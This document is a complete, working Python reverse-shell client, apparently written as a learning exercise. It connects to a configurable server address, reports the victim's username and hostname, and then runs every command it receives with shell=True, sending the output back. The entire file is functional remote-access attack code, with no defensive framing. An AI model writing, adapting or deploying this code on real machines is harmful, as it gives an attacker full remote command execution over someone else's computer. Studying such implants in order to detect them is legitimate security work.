import socket
import subprocess
import os
import sys

SERVER_IP = "192.168.1.246" #Switch with your server's IP address/ domain name
SERVER_PORT = 1234

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))


# --- Send username + hostname to the server ---

username = os.getlogin()
hostname = socket.gethostname()
client.send(f"{username}@{hostname}".encode())

while True:
    try:
        command = client.recv(4096).decode()  #Recieving the command sent from the server
        if not command: #In case the connection with the server is lost (data is: None)
            break

        if command == "exit":
            break

        result = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        output = result.stdout + result.stderr  #The output will have typically one of these; but the purpose here is tp send the stdout and/or the stderr back to the server
        if not output:
            output = "[Command executed but there is no output]\n"  #For commands that executed successfully but have no output (for example: mkdir...)

        client.send(output.encode())


    except Exception as e:
        print("Client error:", e)  #For debugging
        break


try:
    client.shutdown(socket.SHUT_RDWR)  #Shutting down the TCP socket on the OS level
except OSError:
    pass

client.close() #Shutting down the Python handle on the socket
sys.exit()  #Closing the script
